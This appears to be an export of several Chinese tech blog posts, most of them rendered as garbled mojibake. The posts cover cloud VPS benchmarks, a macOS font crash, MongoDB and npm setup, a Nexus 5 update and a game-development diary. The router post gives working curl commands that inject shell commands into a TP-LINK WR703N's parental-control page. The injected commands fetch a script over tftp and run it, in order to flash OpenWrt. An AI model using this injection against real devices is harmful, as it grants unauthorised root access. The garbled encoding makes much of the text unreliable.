Engineçš„è¿è¡Œé€Ÿåº¦è²Œä¼¼æŒºæ…¢çš„ï¼Œå°±æµ‹è¯•äº†ä¸€ä¸‹\né€‰äº†è·ç¦»æ¯”è¾ƒè¿‘çš„åŒºåŸŸ asia-east1-a, è²Œä¼¼æ˜¯åœ¨å°æ¹¾çš„ã€‚\nåˆ›å»ºäº†3ä¸ªä¸åŒé…ç½®çš„å®ä¾‹\nf1-microï¼ˆ1 ä¸ª vCPUï¼Œ0.6 GB å†…å­˜ï¼‰ $5.00/æœˆ g1-smallï¼ˆ1 ä¸ª vCPUï¼Œ1.7 GB å†…å­˜ï¼‰ $15.73/æœˆ n1-standard-1ï¼ˆ1 ä¸ª vCPUï¼Œ3.75 GB å†…å­˜ï¼‰$28.50/æœˆ ç³»ç»Ÿéƒ½é€‰æ‹©äº† Ubuntu 16.04.1 LTS\nCPUæµ‹è¯• æµ‹è¯•æ–¹å¼ Node.js v7.4.0 æºä»£ç ç¼–è¯‘ (æ—¶é—´ç»Ÿè®¡æ–¹å¼ time make)\nf1: 155m35.651s ï¼ˆä¸¤ä¸ªå¤šå°æ—¶ã€‚ã€‚ï¼‰ g1: 55m9.996s n1: 28m27.362s ç›¸æ¯”ä¹‹ä¸‹\ndigitalocean $5.00/æœˆ çš„æœ€ä½é…ç”¨æ—¶ 43m11.467s æœ¬åœ°çš„ç¬”è®°æœ¬i7-5557mçš„CPUä½¿ç”¨2ä¸ªæ ¸å¿ƒ 27m47.806s å¦å¤–f1å’Œg1æ˜¯å…±äº«cpuçš„ å¯ä»¥çœ‹åˆ°åœ¨cpuè´Ÿè½½ä¸Šå‡åå¯ä»¥è¶…è¿‡é™åˆ¶è¿è¡ŒçŸ­æš‚çš„æ—¶é—´ã€‚\nç„¶åæµ‹è¯•ä¸€ä¸‹ç£ç›˜çš„IO æµ‹è¯•æ–¹å¼ ç›´æ¥ä½¿ç”¨ dd if=/dev/zero of=/var/swap.img bs=1024k count=1000 åˆ›å»ºä¸€ä¸ª1Gçš„å¤§æ–‡ä»¶\nf1: 1048576000 bytes (1.0 GB, 1000 MiB) copied, 25.6226 s, 40.9 MB/s g1: 1048576000 bytes (1.0 GB, 1000 MiB) copied, 21.2997 s, 49.2 MB/s n1: 1048576000 bytes (1.0 GB, 1000 MiB) copied, 4.83823 s, 217 MB/s å¯ä»¥å› ä¸ºé€‰æ‹©çš„æ˜¯æ–°çš„ 10 GB æ ‡å‡†æ°¸ä¹…æ€§ç£ç›˜ï¼Œ é€Ÿåº¦æ„Ÿè§‰ä¸€èˆ¬èˆ¬äº†\nç›¸æ¯”ä¹‹ä¸‹digitaloceanå› ä¸ºç”¨çš„SSD, é€Ÿåº¦å¿«äº†ä¸æ­¢ä¸€ç‚¹ oc: 1048576000 bytes (1.0 GB, 1000 MiB) copied, 1.71034 s, 613 MB/s\nä»ç®€å•çš„æµ‹è¯•æ•°æ®æ¥çœ‹ï¼Œ å¾ˆæ˜æ˜¾å¦‚æœæ˜¯å¹³æ—¶ç”¨æ¥æŠ˜è…¾çš„vpsçš„è¯GCEæ€§ä»·æ¯”å¤ªä½äº†ã€‚è€Œä¸”ä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼ŒGCEåˆ›å»ºä¸€ä¸ªå®ä¾‹å·®ä¸å¤šè¦è€—æ—¶2åˆ†é’Ÿå·¦å³ğŸ˜‚\nps f1 é»˜è®¤çš„0.6Gå†…å­˜ç¼–è¯‘Node.jsç«Ÿç„¶ä¼šä¸å¤Ÿç”¨ã€‚åŠ äº†è™šæ‹Ÿå†…å­˜ä¹‹åæ‰é¡ºåˆ©çš„ç¼–è¯‘å®Œæˆ\nUbuntu æ·»åŠ swap:\ndd if=/dev/zero of=/var/swap.img bs=1024k count=1000\nmkswap /var/swap.img\nswapon /var/swap.img\n","date":"2017-01-17T00:00:00Z","permalink":"https://hitian.info/post/google-compute-engine-simple-test/","title":"Google Compute Engine ç®€å•æµ‹è¯•"},{"content":"SourceTree å’Œ FontBook æ‰“å¼€å°±å´©æºƒæœ‰ä¸€æ®µæ—¶é—´äº†. éƒ¨åˆ†crash log å¦‚ä¸‹;\nProcess: SourceTree [555] Path: /Applications/SourceTree.app/Contents/MacOS/SourceTree Identifier: com.torusknot.SourceTreeNotMAS Version: 2.2.2 (51) Code Type: X86-64 (Native) Parent Process: ??? [1] Responsible: SourceTree [555] User ID: 501 Date/Time: 2016-03-13 15:34:07.628 +0800 OS Version: Mac OS X 10.11.3 (15D21) Report Version: 11 Time Awake Since Boot: 550 seconds System Integrity Protection: enabled Crashed Thread: 15 Dispatch queue: com.apple.root.default-qos Exception Type: EXC_BAD_ACCESS (SIGSEGV) Exception Codes: KERN_INVALID_ADDRESS at 0x000007fc4a1f7ab0 Exception Note: EXC_CORPSE_NOTIFY VM Regions Near 0x7fc4a1f7ab0: Process Corpse Info 0000000128acb000-0000000128ccb000 [ 2048K] rw-/rwx SM=COW --\u0026gt; JS JIT generated code 00003a1034000000-00003a1034001000 [ 4K] ---/rwx SM=NUL Application Specific Information: objc_msgSend() selector name: retain Thread 0:: Dispatch queue: com.apple.main-thread 0 com.apple.Foundation 0x000000010c558949 -[_NSCachedIndexSet autorelease] + 8 1 com.apple.AppKit 0x000000010d09762c -[NSTableView(NSTableViewViewBased) hiddenRowIndexes] + 56 2 com.apple.AppKit 0x000000010d0974ea -[_NSTableRowHeightStorage _normalComputeRectOfRow:assumingExists:] + 151 3 com.apple.AppKit 0x000000010cfcbf46 -[_NSTableRowHeightStorage computeRectOfRow:assumingExists:] + 167 4 com.apple.AppKit 0x000000010cfcbe5c -[NSTableView _rectOfRowAssumingRowExists:] + 178 5 com.apple.AppKit 0x000000010cfcbb80 -[NSTableView rectOfRow:] + 88 6 com.apple.AppKit 0x000000010cfd5e40 -[NSTableView frameOfCellAtColumn:row:] + 308 7 com.torusknot.SourceTreeNotMAS\t0x000000010a45922e 0x10a330000 + 1217070 8 com.apple.AppKit 0x000000010d09a1f3 -[NSTableView drawRow:clipRect:] + 1144 9 com.apple.AppKit 0x000000010d099aeb -[NSTableView drawRowIndexes:clipRect:] + 919 10 com.apple.AppKit 0x000000010d098403 -[NSTableView drawRect:] + 1480 11 com.apple.AppKit 0x000000010cf311fe -[NSView(NSInternal) _recursive:displayRectIgnoringOpacity:inGraphicsContext:CGContext:topView:shouldChangeFontReferenceColor:] + 1331 12 com.apple.AppKit 0x000000010cf30b98 __46-[NSView(NSLayerKitGlue) drawLayer:inContext:]_block_invoke + 242 13 com.apple.AppKit 0x000000010cf30843 -[NSView(NSLayerKitGlue) _drawViewBackingLayer:inContext:drawingHandler:] + 2403 14 com.apple.AppKit 0x000000010cf2fed5 -[NSView(NSLayerKitGlue) drawLayer:inContext:] + 108 15 com.apple.AppKit 0x000000010d0d0d8c -[_NSBackingLayerContents drawLayer:inContext:] + 157 16 com.apple.QuartzCore 0x000000010f6d3927 -[CALayer drawInContext:] + 257 17 com.apple.AppKit 0x000000010d0d0862 -[_NSTiledLayer drawTile:inContext:] + 625 18 com.apple.AppKit 0x000000010d0d0593 -[_NSTiledLayerContents drawLayer:inContext:] + 185 19 com.apple.QuartzCore 0x000000010f6d3927 -[CALayer drawInContext:] + 257 20 com.apple.AppKit 0x000000010d0d04d1 -[NSTileLayer drawInContext:] + 169 21 com.apple.QuartzCore 0x000000010f6d1e79 CABackingStoreUpdate_ + 3494 22 com.apple.QuartzCore 0x000000010f6d10cd ___ZN2CA5Layer8display_Ev_block_invoke + 59 23 com.apple.QuartzCore 0x000000010f6c4d31 CA::Layer::display_() + 1565 24 com.apple.AppKit 0x000000010d0d03e8 -[NSTileLayer display] + 119 25 com.apple.AppKit 0x000000010d850b34 -[_NSTiledLayerContents update:shouldCallPrepareContent:] + 7131 26 com.apple.AppKit 0x000000010cf7aca4 -[_NSTiledLayer display] + 368 27 com.apple.QuartzCore 0x000000010f6c310d CA::Layer::display_if_needed(CA::Transaction*) + 603 28 com.apple.QuartzCore 0x000000010f6c278d CA::Layer::layout_and_display_if_needed(CA::Transaction*) + 35 29 com.apple.QuartzCore 0x000000010f6c1cf1 CA::Context::commit_transaction(CA::Transaction*) + 277 30 com.apple.QuartzCore 0x000000010f6c1a24 CA::Transaction::commit() + 508 31 com.apple.QuartzCore 0x000000010f6d0917 CA::Transaction::observer_callback(__CFRunLoopObserver*, unsigned long, void*) + 71 32 com.apple.CoreFoundation 0x000000010b469e37 __CFRUNLOOP_IS_CALLING_OUT_TO_AN_OBSERVER_CALLBACK_FUNCTION__ + 23 33 com.apple.CoreFoundation 0x000000010b469da7 __CFRunLoopDoObservers + 391 34 com.apple.CoreFoundation 0x000000010b45b358 CFRunLoopRunSpecific + 328 35 com.apple.HIToolbox 0x00000001101cf935 RunCurrentEventLoopInMode + 235 36 com.apple.HIToolbox 0x00000001101cf76f ReceiveNextEventCommon + 432 37 com.apple.HIToolbox 0x00000001101cf5af _BlockUntilNextEventMatchingListInModeWithFilter + 71 38 com.apple.AppKit 0x000000010cecd0ee _DPSNextEvent + 1067 39 com.apple.AppKit 0x000000010d299943 -[NSApplication _nextEventMatchingEventMask:untilDate:inMode:dequeue:] + 454 40 com.apple.AppKit 0x000000010cec2fc8 -[NSApplication run] + 682 41 com.apple.AppKit 0x000000010ce45520 NSApplicationMain + 1176 42 libdyld.dylib 0x0000000111d135ad start + 1 å¯ä»¥çœ‹å‡ºæ¥åº”è¯¥æ˜¯å­—ä½“å¯¼è‡´çš„é—®é¢˜, å°è¯•äº†ç½‘ä¸Šçš„å¤§éƒ¨åˆ†è§£å†³æ–¹æ¡ˆ, åŒ…æ‹¬ æ¸…ç† Library/FontCollections, é‡å»ºç¼“å­˜ä»€ä¹ˆçš„, éƒ½æ²¡æœ‰æ•ˆæœ.\nä½†æ˜¯åœ¨GUESTè´¦æˆ·ä¸‹, å¹¶æ²¡æœ‰å´©æºƒçš„é—®é¢˜, çŒœæµ‹å’Œå½“å‰ç”¨æˆ·çš„æŸäº›é…ç½®æœ‰é—®é¢˜.\nç»ˆç«¯æ‰§è¡Œ defaults read \u0026gt; ~/Downloads/defaults.txt å¯¼å‡ºå½“å‰ç”¨æˆ·çš„é…ç½®ä¿¡æ¯.\nå…¨å±€æœç´¢NSFont, åœ¨ Apple Global Domain èŠ‚ç‚¹ä¸‹å‘ç°äº† NSFont = MicrosoftYaHei;\nçœ‹èµ·æ¥æ˜¯ä¹‹å‰æµ‹è¯•MS Office ç•™ä¸‹çš„. å¸è½½ä¹‹åä¼°è®¡ MicrosoftYaHei ä¹Ÿæ²¡æœ‰äº†.\næ‰“å¼€ TinkerTool \u0026raquo; Fonts ä½¿ç”¨ Set to default ä¹‹åå´©æºƒçš„é—®é¢˜å…¨éƒ¨è§£å†³äº†.\n","date":"2016-03-13T00:00:00Z","permalink":"https://hitian.info/post/sourcetree-crash-by-font-osx/","title":"OSXä¸Šä¸æ­£ç¡®çš„å­—ä½“è®¾ç½®å¯¼è‡´éƒ¨åˆ†è½¯ä»¶å´©æºƒçš„é—®é¢˜"},{"content":"ubuntu version:\nDISTRIB_ID=Ubuntu DISTRIB_RELEASE=15.04 DISTRIB_CODENAME=vivid DISTRIB_DESCRIPTION=\u0026#34;Ubuntu 15.04\u0026#34; æ–°å»ºæ–‡ä»¶ /etc/apt/sources.list.d/mongodb-org-3.0.list å†…å®¹å¦‚ä¸‹ (ä½¿ç”¨aliyunçš„mirrorè¿›è¡ŒåŠ é€Ÿ)\ndeb http://mirrors.aliyun.com/mongodb/apt/ubuntu/ trusty/mongodb-org/3.0 multiverse æ·»åŠ key \u0026amp; update apt:\nsudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 7F0CEB10 sudo apt-get update å®‰è£… mongodb æœ€æ–°ç‰ˆæœ¬\nsudo apt-get install mongodb-org ç›®å‰å®‰è£…çš„ç‰ˆæœ¬\n~$ mongo --version MongoDB shell version: 3.0.4 ","date":"2015-07-11T00:00:00Z","permalink":"https://hitian.info/post/ubuntu-install-mongodb-3.0-with-apt/","title":"ubuntu é€šè¿‡apt å®‰è£… mongodb 3.0"},{"content":"npmçš„åŠ é€Ÿæ¯”è¾ƒç®€å•, ç›´æ¥ä½¿ç”¨æ·˜å®çš„ http://npm.taobao.org/ å°±å¯ä»¥äº†.\nå»ºè®®ç›´æ¥å®‰è£… cnpm, æ–¹ä¾¿ä¸€ç‚¹\nnpm install -g cnpm --registry=https://registry.npm.taobao.org\nä½¿ç”¨çš„æ—¶å€™ç›´æ¥ç”¨cnpmæ›¿ä»£npmå°±å¯ä»¥äº†. ä¾‹å¦‚:\ncnpm install mongodb\nä¹Ÿå¯ä»¥åœ¨ä½¿ç”¨npm çš„æ—¶å€™å•ç‹¬æŒ‡å®š\nnpm install xxx --registry=https://registry.npm.taobao.org\nè¿™æ ·å°±å¿«å¤šäº†.\nå¦å¤–æœ‰æ—¶å€™ node-gyp rebuild è¿‡ç¨‹ä¸­ä¸‹è½½ç›¸åº”nodeç‰ˆæœ¬ä¹Ÿå¾ˆæ…¢.\nçœ‹æç¤ºå»æ‰‹åŠ¨ä¸‹è½½éœ€è¦çš„nodeç‰ˆæœ¬.\nä¾‹å¦‚ node-v0.12.2.tar.gz\ntar zcvf node-v0.12.2.tar.gz mv ./node-v0.12.2 ~/.node-gyp/0.12.2 touch ~/.node-gyp/0.12.2/installVersion echo \u0026#34;9\u0026#34; \u0026gt;~/.node-gyp/0.12.2/installVersion ","date":"2015-04-06T00:00:00Z","permalink":"https://hitian.info/post/nodejs-npm-build-speed-up/","title":"nodejs ç›¸å…³çš„å¢™å†…åŠ é€Ÿ"},{"content":"ç‰ˆæœ¬å·: ver 1.7\nåŸå§‹å›ºä»¶ç‰ˆæœ¬: 3.17.1 Build 140120 Rel.56593n\nå°è¯•äº†ä¸€ä¸‹, è¿™ä¸ªç‰ˆæœ¬æ˜¯ä¸èƒ½é€šè¿‡webä¸Šä¼ éå®˜æ–¹çš„å›ºä»¶, å°è¯•ä¸Šä¼ openwrtä¼šæŠ¥é”™\né”™è¯¯ä»£ç ï¼š18005 ä¸Šä¼ çš„æ–‡ä»¶ç‰ˆæœ¬ä¸æœºå‹ä¸ç¬¦ã€‚\nè¯„è®ºè¯´æ˜¯åŠ äº†ç­¾åçš„çš„åŸå› .\ngoogleäº†ä¸‹æ‰¾åˆ°è¿™ç¯‡æ–‡ç« :\nhttp://www.shadowandy.net/2015/03/flashing-tp-link-tl-wr703n-v1-7-to-openwrt.htm\nå¤§å®¶å¯ä»¥å‚ç…§åšä¸€ä¸‹.\nä¸¥é‡è­¦å‘Š, åˆ·æœºéœ€è°¨æ…, æˆ‘æ˜¯å‡†å¤‡å¥½TTLçº¿æ‰åŠ¨æ‰‹çš„, å¦‚æœæ²¡æœ‰æœ€å¥½ä¸è¦å†’é™©, å¾ˆå®¹æ˜“å˜ç –çš„\u0026hellip; å…ˆæŒ‰æ­¥éª¤ç”Ÿæˆæˆ–ä¸‹è½½è¿™å››ä¸ªè¦æ”¾åœ¨tftpä¸‹çš„æ–‡ä»¶:\naa i1 i2 busybox æˆ‘ä½¿ç”¨è¿‡çš„æ‰“åŒ…å…±äº«ä¸€ä¸‹ ç™¾åº¦ç½‘ç›˜ä¸‹è½½\næ ¸å¿ƒçš„3æ¡å‘½ä»¤:\ncurl -o - -b \u0026#34;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=true\u0026#34; \u0026#34;http://192.168.1.1/\u0026#34; curl -o - -b \u0026#34;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=\u0026#34; --referer \u0026#34;http://192.168.1.1/userRpm/ParentCtrlRpm.htm\u0026#34; \u0026#34;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?ctrl_enable=1\u0026amp;parent_mac_addr=00-00-00-00-00-02\u0026amp;Page=1\u0026#34; curl -o - -b \u0026#34;tLargeScreenP=1; subType=pcSub; Authorization=Basic%20YWRtaW46YWRtaW40Mg%3D%3D; ChgPwdSubTag=\u0026#34; --referer \u0026#34;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?Modify=0\u0026amp;Page=1\u0026#34; \u0026#34;http://192.168.1.1/userRpm/ParentCtrlRpm.htm?child_mac=00-00-00-00-00-01\u0026amp;lan_lists=888\u0026amp;url_comment=test\u0026amp;url_0=;cd%20/tmp;\u0026amp;url_1=;tftp%20-gl%20aa%20192.168.1.9;\u0026amp;url_2=;sh%20aa;\u0026amp;url_3=\u0026amp;url_4=\u0026amp;url_5=\u0026amp;url_6=\u0026amp;url_7=\u0026amp;scheds_lists=255\u0026amp;enable=1\u0026amp;Changed=1\u0026amp;SelIndex=0\u0026amp;Page=1\u0026amp;rule_mode=0\u0026amp;Save=%B1%A3+%B4%E6\u0026#34; æœ‰å‡ ç‚¹è¦æ³¨æ„çš„:\ntftpéœ€è¦è¿è¡Œåœ¨windowsä¸Š, è€Œä¸”è¦ä½¿ç”¨32ä½çš„ç‰ˆæœ¬, (Macä¸Šçš„tftpå°è¯•è¿‡æ— æ•ˆçš„). å°†ipè°ƒæ•´ä¸º192.168.1.9 å¦å¤–æ‰§è¡Œå‘½ä»¤ä¹‹å‰éœ€è¦å…ˆåœ¨ç®¡ç†ç•Œé¢æ‰§è¡Œæ¢å¤å‡ºå‚, é‡å¯å®Œä¸è¦è®¾ç½®å¯†ç , ç›´æ¥å¼€å§‹. windowséœ€è¦è‡ªå·±è£…curl. æœ€åçš„ä¸€æ¡å‘½ä»¤æ¯”è¾ƒæ…¢, ä¸€å®šè¦ç­‰åˆ°è·¯ç”±å™¨çš„ç¯ä¸åœ¨é—ªäº†, æˆ–è€…ç›´æ¥åœ¨ç”µè„‘ä¸Šæ‰“å¼€http://192.168.1.1ä¸æ–­çš„åˆ·æ–°, ä»€ä¹ˆæ—¶å€™çœ‹åˆ°OpenWrtçš„ç•Œé¢äº†å°±å¥½äº†. ç„¶åæ’ä¸ªUç›˜, å‡çº§ä¸€ä¸‹ç©ºé—´, å°±å¯ä»¥å°½æƒ…æŠ˜è…¾äº†.\nå®Œæˆå:\næœ€åæ„Ÿè°¢ä¸€ä¸‹åŸæ–‡çš„ä½œè€…, å› ä¸ºæœ‰è¿™äº›æ— ç§å…±äº«çš„äºº, ä¸–ç•Œæ‰ä¼šæ›´ç¾å¥½.\nè¿˜è¦æ„Ÿè°¢ä¸€ä¸‹google, è®©æˆ‘å¾ˆå¿«æ‰¾åˆ°äº†è¿™ç¯‡æ–‡ç« .\n","date":"2015-03-21T00:00:00Z","permalink":"https://hitian.info/post/tp-link-tl-wr703n-v1.7-openwrt/","title":"TP-LINK TL-WR703N åˆ· OpenWRT"},{"content":"Android 5.1 å‘å¸ƒå·²ç»æœ‰ä¸€æ®µæ—¶é—´äº†, nexus5çš„ROMå‡ºæ¥ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†, ä½†æ˜¯OTAä¸€ç›´ä¸æ¨é€, æŒºç€æ€¥çš„. googleäº†ä¸€ä¸‹, å†³å®šè‡ªå·±å‡çº§ä¸€ä¸‹.\n####å…ˆå»ä¸‹è½½OTAçš„å‡çº§åŒ…\nnexus5 ä»5.0.1 åˆ° 5.1 çš„åŒ…: ç™¾åº¦ç½‘ç›˜\nå…¶ä»–çš„è¿™é‡Œä¸‹è½½: link\n####å…¶ä»–çš„å‡†å¤‡\næ²¡æœ‰adbçš„å…ˆå»è£…ä¸€ä¸‹ å°†æ‰‹æœºçš„å¼€å‘è€…æ¨¡å¼æ‰“å¼€(è¿æŒ‰å…³äºæ‰‹æœºä¸­çš„ç‰ˆæœ¬å·) ####å¼€å§‹äº†\nå…ˆå…³æœº æŒ‰ä½ éŸ³é‡ä¸‹ å’Œ ç”µæºé”® å¯åŠ¨è¿›å…¥FASTBOOT MODE æŒ‰éŸ³é‡ä¸Šä¸‹ é€‰æ‹© Recovery mode, æŒ‰ç”µæºé”®è¿›å…¥ è‡ªåŠ¨é‡å¯åä¼šæ˜¾ç¤ºä¸€ä¸ªæ„Ÿå¹å·çš„æœºå™¨äºº, ä¸‹é¢æ˜¾ç¤ºæ— å‘½ä»¤, æŒ‰ä½éŸ³é‡ä¸Šå’Œç”µæºé”®è¿›å…¥recovery çš„èœå•. é€‰æ‹©apply update from ADB å¹¶ç¡®å®š è¿æ¥æ‰‹æœºåˆ°ç”µè„‘, å‘½ä»¤è¡Œè¿›å…¥ä¸‹è½½çš„åŒ…ç›®å½•, æ‰§è¡Œadb sideload update.zip ç­‰å¾…å®Œæˆ, å¤§æ¦‚éœ€è¦6åˆ†é’Ÿå·¦å³, ç„¶åé€‰æ‹© reboot system now å®Œæˆäº†. å‡çº§å®Œæˆäº†:\né‡æ–°å¯åŠ¨è¿‡ç¨‹ä¸­ä¼šå‡çº§å·²æœ‰çš„App, è¿™ä¸ªåªèƒ½è€å¿ƒç­‰å¾…äº†..\nå‚è€ƒ: http://www.androidbeat.com/2014/12/manually-sideload-android-lollipop-update-nexus-5/\n","date":"2015-03-20T00:00:00Z","permalink":"https://hitian.info/post/manually-update-nexus-5-from-ota/","title":"æ‰‹åŠ¨ä»OTAåŒ…å‡çº§nexus 5"},{"content":"åˆ°ä»Šå¤©ä¸ºæ­¢, æŠ˜è…¾äº†10ä¸ªæœˆçš„æ¸¸æˆç»ˆäºç»“æŸäº†, è™½ç„¶google play storeçš„ç‰ˆæœ¬å·²ç»ä¸Šæ¶æœ‰ä¸€æ®µæ—¶é—´äº†, iOSçš„è¿˜æ­£åœ¨å®¡æ ¸ä¸­, ä¸è¿‡åç»­çš„ç‰ˆæœ¬åº”è¯¥å·²ç»ä¸ä¼šå†å¼€å‘äº†. ä¹Ÿç®—æ˜¯è¿™10ä¸ªæœˆçš„åŠªåŠ›æ²¡æœ‰ç™½è´¹.\n###2013å¹´3æœˆ###\næ­£åœ¨ç»´æŠ¤åç«¯çš„æ¸¸æˆè¿›å…¥äº†æœ€åé˜¶æ®µ, è™½ç„¶æ¯å¤©éƒ½è¿˜æœ‰ä¸å°‘çš„æ”¶å…¥, ä½†å¯¹äºä¸€ä¸ªä¸ç®—å°çš„æ¸¸æˆå…¬å¸æ¥è¯´è·¨å›½çš„è¿è¥å·²ç»å¤ªè´¹åŠ›äº†. äºæ˜¯å†³å®šä¸€æ®µæ—¶é—´åå°±ä¸åœ¨è¿›è¡Œæ›´æ–°äº†, ç­‰ç©å®¶æµå¤±,ç„¶åå…³æœ. é¡¹ç›®ç»„çš„äººå‘˜å¼€å§‹æ…¢æ…¢çš„è°ƒåˆ°å…¶ä»–çš„é¡¹ç›®ç»„. ç„¶å, leaderé—®æˆ‘æ„¿ä¸æ„¿æ„è·Ÿä»–å»å¼€å‘ä¸ªæ–°æ¸¸æˆ, ç„¶åå°±å»äº†.\nè¯è¯´ä»å¤§ä¸‰èµ·å°±ä¸€ç›´åœ¨è¿›è¡Œwebå¼€å‘, æ¯•ä¸šåçš„3å¹´ä¹Ÿæ˜¯, å¯¹æ‰‹æœºç«¯æ¸¸æˆå¼€å‘æ¯«æ— æ¦‚å¿µ, è€å¤§ä»¬å†³å®šè¦ç”¨jsä½œä¸ºä¸»è¦çš„å¼€å‘è¯­è¨€, ç„¶åå°±çªç„¶æƒ³æ¢ä¸€ä¸‹å£å‘³, æ­£å¥½å…¬å¸ä¹Ÿå…è®¸æˆ‘ä»¬è¾¹å­¦è¾¹åš, ç„¶åå°±å¼€å§‹è½¬åˆ°å®¢æˆ·ç«¯å¼€å‘äº†.\n###cocos2d-x + javascript###\nåšwebæ—¶ä¹Ÿä¸€ç›´åœ¨æ¥è§¦js, è¿™æ–¹é¢ä¸ç®—é™Œç”Ÿ. cocos2d-xæ¸¸æˆå¼•æ“å¯¹æˆ‘æ¥è¯´æ˜¯ä¸ªæ–°çš„äº‹ç‰©, ä½†æ˜¯å­¦ä¹ æ–°çš„äº‹ç‰©å¦‚æœæœ‰ä¸€å¥—è‡ªå·±çš„å­¦ä¹ æ–¹å¼å…¶å®ä¹Ÿæ˜¯å¾ˆå¿«çš„, æ¸¸æˆuiç”»é¢çš„ç»„ç»‡å…¶å®å’Œå¤§å­¦æ—¶è¯¾è®¾åšçš„javaå›¾å½¢ç•Œé¢æœ‰ç‚¹ç±»ä¼¼, æŠŠæ‰€æœ‰çš„å…ƒç´ æ·»åŠ åˆ°ä¸€ä¸ªæ ‘çŠ¶çš„UIæ ‘ä¸Šå», ç„¶ååœ¨sceneä¸Šæ˜¾ç¤ºå‡ºæ¥, ä¸åŒçš„æ˜¯æ¸¸æˆæœ‰ä¸€ä¸ªä¸»å¾ªç¯, åœ¨é‡Œé¢è¿›è¡Œå¿…è¦çš„åŠ¨ç”»æ“ä½œ, å“åº”ç”¨æˆ·çš„æ“ä½œæˆ–è€…æ˜¯æœåŠ¡å™¨çš„è¿”å›å€¼å¯¹UIæ ‘è¿›è¡Œæ›´æ”¹.\nä»0å¼€å§‹, åœ¨ä¼Ÿå¤§çš„googleçš„å¸®åŠ©ä¸‹, ä»…ä»…ç¬¬10å¤©ç¬¬ä¸€ä¸ªdemoå°±å‡ºæ¥äº†, è™½ç„¶åªæœ‰ä¸€ä¸ªåœºæ™¯, ä½†æ˜¯æ ¸å¿ƒçš„æ¶ˆé™¤é€»è¾‘å·²ç»å¯ä»¥åˆæ­¥ä½¿ç”¨äº†. ç„¶åå°±ç«‹å³æœ‰ä¿¡å¿ƒäº†. é¡¹ç›®ä¹Ÿå°±æ­£å¼å¼€å§‹äº†.\n###å‘çš„å¼€å§‹â€¦###\nFacebook, å› ä¸ºæ˜¯è¦åœ¨å°æ¹¾å‘è¡Œçš„æ¸¸æˆ, å†³å®šæ·±åº¦æ•´åˆFacebook. ç”±äºæŸäº›åŸå› , å³ä½¿æœ‰ä¸“çº¿,å’ŒFacebookæœåŠ¡çš„é€šè®¯é€šç•…åº¦ä¹Ÿæ ¹æœ¬å°±æ˜¯ä¸ªæ‚²å‰§, å¼€å‘å’Œæµ‹è¯•è¿‡ç¨‹ä¸­å„ç§è°ƒç”¨å¼‚å¸¸, ä¸€å¥è¯, ä¸è¦åœ¨å›½å†…åšè¿™æ–¹é¢çš„å¼€å‘.\njsä½œä¸ºå¼€å‘è¯­è¨€æ˜¯å¾ˆæ–¹ä¾¿, ä½†æ˜¯å¦‚æœå’Œç¬¬ä¸‰æ–¹sdkçš„äº¤äº’æ¯”è¾ƒå¤š, æƒ³è±¡ä¸€ä¸‹æ“ä½œé“¾: js =\u0026gt; jsè§£é‡Šå™¨ =\u0026gt; c++ =\u0026gt; jni =\u0026gt; java, ç‰¹åˆ«æ˜¯jså’Œc++ æ˜¯å®Œå…¨ä¸åŒçš„è¯­è¨€ç±»å‹, æˆ‘ä»¬éœ€è¦åšå¥½å¤šçš„æ¥å£å’Œå›è°ƒ, åˆæ˜¯åœ¨androidä¸Šè¿è¡Œ, äº’ç›¸è°ƒç”¨æ—¶ä¼šå‘ç”Ÿå„ç§å„æ ·çš„å´©æºƒé—®é¢˜. è¦ç‰¹åˆ«æ„Ÿè°¢ä¸€ä¸‹iOSæ²¡è®©æˆ‘ä»¬åœ¨è¿™æ–¹ä¾¿èŠ±è´¹å¤ªå¤šçš„æ—¶é—´.\n###äººæ°¸è¿œéƒ½æ˜¯å¾ˆç¼ºçš„###\nè¯´èµ·æ¥ç¨‹åºåº”è¯¥æ˜¯å¾ˆå¤šçš„, ä½†æ˜¯æ„Ÿè§‰ä¸€ç›´æ‹›ä¸åˆ°äºº, æ•´ä¸ªé¡¹ç›®ç¨‹åºæœ€å¤šçš„æ—¶å€™ä¹Ÿå°±3ä¸ªæ­£å¼å‘˜å·¥åŠ ä¸¤ä¸ªå®ä¹ ç”Ÿ. å¤§éƒ¨åˆ†æ—¶é—´éƒ½åªæœ‰ä¸¤ä¸ªç¨‹åº, è€Œä¸”æœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯éƒ½è¦åš. è¿˜å¥½åªæ˜¯ä¸æŒ‡æœ›èµšå¤šå°‘é’±çš„ä¼‘é—²ç±»æ¸¸æˆ, å¤§éƒ¨åˆ†æ—¶é—´ä¹Ÿæ²¡æœ‰é‚£ä¹ˆèµ¶è¿›åº¦. å¦å¤–, å› ä¸ºæ‹›ä¸åˆ°æ­£å¼å‘˜å·¥, å°±æ‹›å¾ˆå¤šå®ä¹ ç”Ÿæ¥è¡¥ç©ºç¼ºå…¶å®æŒºä¸é“å¾·çš„, æ ¹æœ¬ç®—ä¸ä¸ŠåŸ¹å…», å¯¹åˆ«äººçš„é˜…å†å…¶å®ä¹Ÿæ²¡ä»€ä¹ˆä½œç”¨. å¦å¤–, äººå°‘å°±æ„å‘³ç€å„ä¸ªæ–¹é¢éƒ½è¦è‡ªå·±åŠ¨æ‰‹åš, ç§¯ç´¯ç»éªŒç¡®å®æ˜¯å¿«.\n###è¯´åˆ°åº•è¿˜æ˜¯è¦èµšé’±###\nè™½ç„¶ä¸€å¼€å§‹ç«‹é¡¹å°±è¯´æ²¡æŒ‡æœ›èµšå¤šå°‘é’±, å°è¯•ä¸€ä¸‹æ–°æ¸¸æˆç±»å‹, ç§¯ç´¯ç”¨æˆ·. å…¶å®å…¬å¸è¿˜æ˜¯å¾ˆåœ¨ä¹é’±çš„é—®é¢˜, æ¯•ç«Ÿå¼€å‘æ˜¯è¦æˆæœ¬çš„. å¼€å§‹è¿˜æ˜¯å¾ˆå¼€å¿ƒçš„, å…³æ³¨çš„éƒ½æ˜¯å¦‚ä½•æé«˜æ¸¸æˆæ ¸å¿ƒç©æ³•çš„å“è´¨, 